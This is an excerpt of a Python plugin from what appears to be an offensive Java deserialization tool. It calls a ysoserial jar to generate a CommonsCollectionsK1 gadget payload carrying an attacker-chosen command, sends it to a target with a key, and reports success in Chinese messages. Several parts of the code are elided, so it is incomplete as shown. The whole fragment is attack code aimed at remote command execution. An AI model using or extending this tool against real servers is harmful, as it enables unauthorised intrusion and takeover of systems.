...
JAR_FILE = 'module/ysoserial_Koalr.jar'

@Idea.plugin_register('Class2:CommonsCollectionsK1')
class CommonsCollectionsK1(object):
    ...
    def generator(self, key, target, command, file_path=JAR_FILE):
        ...
        popen = subprocess.Popen(
            ['java', '-jar', file_path, 'CommonsCollectionsK1', command],
        ...
        try:
            ...
            if resp.status_code == 200:
                print(
                    "[+]CommonsCollectionsK1模块key: {} 已成功发送! 状态码:{}".format(
                        str(key), str(resp.status_code)
                    )
                )
            else:
                print(
                    "[-]CommonsCollectionsK1模块key: {} 发送异常! 状态码:{}".format(
                        str(key), str(resp.status_code)
                    )
                )
        except Exception:
